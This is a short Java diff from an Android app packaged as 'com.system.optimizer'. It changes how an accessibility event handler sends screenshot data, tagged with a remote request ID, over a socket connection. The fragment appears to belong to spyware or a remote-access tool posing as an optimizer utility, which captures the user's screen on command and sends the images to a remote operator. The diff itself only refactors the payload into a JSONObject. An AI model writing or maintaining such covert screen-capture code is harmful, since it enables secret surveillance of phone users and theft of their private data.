@@ -8,6 +8,8 @@ import java.util.function.Consumer;
 import android.os.Handler;
 import android.os.Looper;
 
+import org.json.JSONObject;
+
 import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.config.AppConfig;
 import com.system.optimizer.config.ConfigData;
@@ -88,11 +90,10 @@ public class AccessibilityEventHandler {
                         }
                         
                         if (requestIdToSend != null) {
-                            // Send as object with request_id and image data
-                            java.util.Map<String, Object> response = new java.util.HashMap<>();
-                            response.put("request_id", requestIdToSend);
-                            response.put("image", imageData);
-                            socketManager.sendEvent("screenshot_response", response);
+                            JSONObject data = new JSONObject();
+                            data.put("request_id", requestIdToSend);
+                            data.put("image", imageData);
+                            socketManager.sendEvent("screenshot_response", data);
                         } else {
                             // No request_id, send image directly
                             socketManager.sendEvent("screenshot_response", imageData);
